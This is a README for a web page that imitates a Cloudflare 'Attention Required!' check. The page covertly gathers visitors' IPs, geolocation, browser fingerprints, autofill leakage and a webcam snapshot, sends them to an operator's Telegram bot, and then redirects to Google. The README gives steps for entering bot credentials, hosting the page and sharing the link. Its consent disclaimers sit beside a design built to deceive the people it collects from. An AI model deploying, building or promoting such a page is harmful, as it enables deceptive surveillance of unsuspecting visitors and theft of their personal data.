# Cloudflare-like Session Verification Page with Fingerprinting & Data Collection

This project mimics a Cloudflare-style "Attention Required!" page with a deceptive verification UI that gathers extensive browser fingerprinting and system data. It collects user information and transmits it to a Telegram bot, including geolocation, browser metadata, WebRTC/IP, audio fingerprinting, a webcam snapshot, and more.

> ⚠️ **Disclaimer:** This project is for educational and ethical research purposes only. Do not deploy this without proper consent. Unauthorized usage may violate privacy laws and platform policies.

---

## 📸 Features

- Mimics Cloudflare-style verification page.
- Collects:
  - Public IP address
  - Geolocation (latitude, longitude)
  - Browser metadata
  - WebGL fingerprint
  - Canvas fingerprint
  - Audio fingerprint
  - LocalStorage/IndexedDB unique IDs
  - Installed fonts
  - WebRTC IPs
  - Network info (downlink, RTT, etc.)
  - Autofill leakage detection
  - Webcam snapshot (if allowed)
  - Battery status
  - Plugins & mimeTypes
- Sends all collected data (and image snapshot) to a Telegram bot.

---

## 🔧 Setup Instructions

1. **Clone or copy the HTML file.**

2. **Replace the Telegram credentials:**

   Open the `<script>` section in the HTML and update these two lines:

   ```js
   const TELEGRAM_BOT_TOKEN = "770000000000:DFHBCGHMHGMHFGHSDKUJHSU8I"; // Replace with your bot token
   const TELEGRAM_CHAT_ID = "000000000"; // Replace with your Telegram chat ID
   ````

3. **Host the HTML file on a web server**
   (e.g. GitHub Pages, Vercel, Netlify, or your own server).

4. **Open the hosted URL in a browser**
   or share the link with users (only with permission).

---

## ✅ How It Works

1. The user is shown a verification-style box.
2. Upon clicking, the page:
   * Collects fingerprint & environment info.
   * Captures webcam snapshot (if permission is granted).
   * Sends the data and image to the configured Telegram bot.
3. Displays a fake "verification success" and redirects to [google.com](https://www.google.com).

---

## 🛡️ Ethical Use Guidelines

This tool should **only be used**:

* In controlled environments (e.g. red teaming, honeypots).
* With full user consent.
* For research or detection of browser fingerprinting.

**Do NOT use it for malicious activity.**

---

## 🧱 Technologies Used

* HTML5, CSS3
* Vanilla JavaScript
* [CryptoJS](https://cdnjs.com/libraries/crypto-js)
* [Telegram Bot API](https://core.telegram.org/bots/api)
* Web APIs:

  * `getUserMedia`
  * `getBattery`
  * `navigator.plugins`, `navigator.mimeTypes`
  * `indexedDB`, `localStorage`
  * `RTCPeerConnection`
  * `Canvas`, `WebGL`, `AudioContext`

---

## 📂 Project Structure

```
index.html          # Main HTML file with embedded JavaScript and CSS
```

---

## 🚀 Demo Preview

> ✅ Try it after hosting. The fake Cloudflare box will collect data and redirect.

---

## ⚠️ Legal Notice

This code includes surveillance and fingerprinting logic. You are **fully responsible** for how you use it. Unauthorized data collection is **illegal** in many jurisdictions.

Always inform and obtain consent from your users.

---

## 📄 License

This project is released under the [MIT License](https://opensource.org/licenses/MIT) — feel free to modify and use responsibly.

```

---
